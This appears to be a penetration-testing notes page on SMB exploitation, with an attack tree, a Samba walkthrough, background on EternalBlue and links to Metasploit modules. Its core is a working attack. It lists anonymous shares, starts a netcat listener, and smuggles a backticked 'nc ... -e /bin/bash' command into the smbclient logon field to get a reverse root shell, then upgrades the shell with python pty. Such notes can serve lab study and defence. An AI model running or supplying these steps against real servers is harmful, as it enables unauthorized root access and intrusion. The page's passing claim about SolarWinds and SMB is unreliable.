# SMB exploits

## Attack tree

```text
1 Scan target machine and check for open SMB port
2 Recon
    2.1 Use SMB client and check for anonymous access
    2.2 Detect version
    2.3 Identify possible exploits
3 Exploit 
```

## Example

```text
# smbclient -L <IP address samba server>
```

Password is nothing, just hit enter.

If a `tmp` directory exixts and there is anonymous access, use `nc` for starting a listener:

```text
# nc -lvp 7777
```

Open a new terminal and access the `tmp` directory on the samba server directly:

```text
# smbclient //<IP address samba server>/tmp
```

In `smb\ :>` type `help` to check the logon command is available. If it is, make the reverse connection:

```text
smb\ :> logon "/=`nc <IP address hack machine> 7777 -e /bin/bash`"
```

In the listener terminal the reverse connection appears. Take the terminal view from the shell in the terminal:

```text
# python -c "import pty;pty.spawn(‘/bin/bash’);"
```

Root.

## Notes

Server Message Block (SMB) is the file-sharing protocol for Microsoft networks. SMB uses TCP port 139 (NetBIOS) and TCP port 445.

SMB vulnerabilities have been around for 20+ years. In general, most SMB attacks do not occur because there are no 
expensive tools or applications protecting it, but rather because there was a failure to implement best practices 
surrounding SMB.

There may even still be SMB file systems that are shared out to everyone on the network and have little to no 
configuration against remote attacks, in which case the above example may work. If that does not work, check version, 
check exploit database, and fire up Metasploit.

For example, certain releases of Samba contain a vulnerability in the LSA RPC service that, if exploited, 
can trigger a heap overflow and allow an unprivileged user to execute arbitrary code on the system as the root user.

In 2017, EternalBlue used an exploit used against a vulnerability in SMB v1.0. Among the malware that used the 
EternalBlue exploit were WannaCry and Emotet, both of which can self-propagate. And as new threats appear, they 
are most likely to continue to use similar attack techniques to exploit a system or network. The recent SolarWinds 
attack exploited the SMB protocol too.

## Tools

* [Samba SetInformationPolicy AuditEventsInfo Heap Overflow](https://www.infosecmatter.com/metasploit-module-library/?mm=exploit/linux/samba/setinfopolicy_heap)
* [MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption](https://www.infosecmatter.com/metasploit-module-library/?mm=exploit/windows/smb/ms17_010_eternalblue)
* [MS10-061 Microsoft Print Spooler Service Impersonation Vulnerability](https://www.infosecmatter.com/metasploit-module-library/?mm=exploit/windows/smb/ms10_061_spoolss)